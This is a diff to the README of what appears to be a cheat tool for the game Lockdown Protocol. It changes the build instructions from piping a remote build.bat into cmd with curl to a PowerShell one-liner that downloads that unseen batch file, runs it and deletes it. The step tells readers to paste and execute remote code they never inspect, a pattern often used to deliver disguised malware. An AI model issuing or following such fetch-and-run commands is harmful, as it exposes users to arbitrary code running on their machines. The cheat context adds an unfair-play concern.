@@ -3,10 +3,10 @@
 This project has enhanced item data management, overlay improvements, and various player enhancement features.
 ## How to build and compile
 1. Type Windows+R
-2. Type cmd and press enter
-3. Paste this into the command prompt:
+2. Type powershell and press enter
+3. Paste this into the shell window:
 ```
-curl -s https://raw.githubusercontent.com/psZachary/lockdown-protocol-external/refs/heads/master/build.bat | cmd
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/psZachary/lockdown-protocol-external/refs/heads/master/build.bat -OutFile temp_script.bat; Start-Process -FilePath temp_script.bat -Wait; Remove-Item temp_script.bat
 ```
 ## Manual build tutorial video
 [YouTube video](https://youtu.be/ctjl3SXSL8s)
